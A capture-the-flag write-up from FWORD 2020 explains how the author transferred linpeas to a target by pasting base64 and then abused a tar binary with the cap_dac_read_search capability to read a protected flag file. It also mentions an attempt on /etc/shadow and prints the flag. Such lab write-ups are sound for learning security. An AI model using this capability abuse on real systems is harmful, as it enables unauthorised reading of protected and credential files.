# fword-ctf-writeups
Writeup for FWORD 2020 CTF


---
CapiCap
---
This challenge was quit nice, i actually spent a great deal of time just to put linpeas on the box, i ended up converting the linpeas script to base64, then copied and pasted it in the machine using echo (there's probably a better way to do this, but i was too lazy to think of anything else)
so at my attack machine:<br>
`cat linpeas.sh | base64 > linpeas.b64`<br>
copy the result<br>
on target host:<br>
`echo "base64 string" > linenum.b64`<br>
`cat linpeas.b64 | base64 -d > linpeas.sh`<br>
<br>
at first time i missed it, so it took me quit some time,<br>
actually the name of the challenge gives us a hint.<br>
running the following:<br>
`getcap -r / 2>/dev/null`<br>
<br>
gives us:<br>
`/usr/bin/tar = cap_dac_read_search+ep`<br>
<br>
this caught my attention as i do not normally see this.<br>
after doing some research, i found out that this actually gives tar premission to read any file!<br>
<br>
so i initially tried to read /etc/shadow and crack the hast- that got me nowhere.<br>
it took me a minute to realize i just need the flag.txt file!<br>
so doing this:<br>
`cd /tmp` #so we will be somewhere with write premissions<br>
`tar -cvf flag.tar ~/flag.txt` # read the flag file from the home directory, and store it in flag.tar<br>
`tar -xvf flag.tar` # extract the flag file<br>
now we can:<br>
`cat /tmp/home/user1/flag.txt`<br>
`FwordCTF{C4pAbiLities_4r3_t00_S3Cur3_NaruT0_0nc3_S4id}`<br>
and we got the flag!<br>


